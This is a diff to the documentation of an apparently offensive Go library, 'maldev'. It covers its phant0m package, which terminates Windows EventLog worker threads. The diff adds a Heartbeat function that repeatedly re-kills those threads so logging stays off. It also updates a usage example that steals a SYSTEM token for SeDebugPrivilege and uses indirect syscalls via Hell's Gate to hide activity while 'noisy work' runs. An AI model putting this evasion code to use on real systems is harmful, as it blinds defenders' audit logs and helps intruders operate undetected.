@@ -68,6 +68,7 @@ terminating every thread in the EventLog PID.
 | Symbol | Description |
 |---|---|
 | [`Kill(caller *wsyscall.Caller) error`](https://pkg.go.dev/github.com/oioio-space/maldev/process/tamper/phant0m#Kill) | Terminate EventLog worker threads. `caller=nil` uses WinAPI; non-nil routes `NtTerminateThread` through indirect syscalls. |
+| [`Heartbeat(ctx context.Context, interval time.Duration, caller *wsyscall.Caller) error`](https://pkg.go.dev/github.com/oioio-space/maldev/process/tamper/phant0m#Heartbeat) | First Kill is synchronous (returns its error); subsequent Kills run every `interval` until `ctx` is cancelled. Defeats SCM/WMI heartbeat re-spawns of the EventLog workers. |
 | [`Technique() evasion.Technique`](https://pkg.go.dev/github.com/oioio-space/maldev/process/tamper/phant0m#Technique) | `evasion.Technique` adapter for `evasion.ApplyAll`. |
 | [`var ErrNoTargetThreads`](https://pkg.go.dev/github.com/oioio-space/maldev/process/tamper/phant0m#ErrNoTargetThreads) | No EventLog worker threads identified — fallback also failed. |
 
@@ -95,14 +96,15 @@ caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHellsGate())
 _ = phant0m.Kill(caller)
 ```
 
-### Advanced — token theft + ticker re-kill
+### Advanced — token theft + Heartbeat ticker
 
 Steal a SYSTEM token to obtain `SeDebugPrivilege`, silence the
-event log, then re-kill on a ticker because SCM may restart
-worker threads on heartbeat checks.
+event log, then re-kill on a built-in ticker so SCM/WMI
+re-spawns of the EventLog workers don't undo the kill.
 
 ```go
 import (
+    "context"
     "log"
     "time"
 
@@ -117,13 +119,23 @@ _ = tok.EnablePrivilege("SeDebugPrivilege")
 
 caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHellsGate())
 
-if err := phant0m.Kill(caller); err != nil {
-    log.Printf("phant0m: %v", err)
-}
-for range time.Tick(5 * time.Minute) {
-    _ = phant0m.Kill(caller)
-}
+ctx, cancel := context.WithCancel(context.Background())
+defer cancel() // stop the heartbeat at scope exit
+
+go func() {
+    if err := phant0m.Heartbeat(ctx, 5*time.Second, caller); err != nil &&
+        !errors.Is(err, context.Canceled) {
+        log.Printf("phant0m heartbeat: %v", err)
+    }
+}()
+
+// ... noisy work runs here, EventLog stays silent ...
 ```
+
+`Heartbeat` returns the first `Kill` error synchronously, so the
+goroutine bails immediately if the initial silencing fails. After
+that, transient `Kill` errors are silently retried — only the
+context cancellation surfaces as a final return.
 
 See [`ExampleKill`](../../../process/tamper/phant0m/phant0m_example_test.go).
 
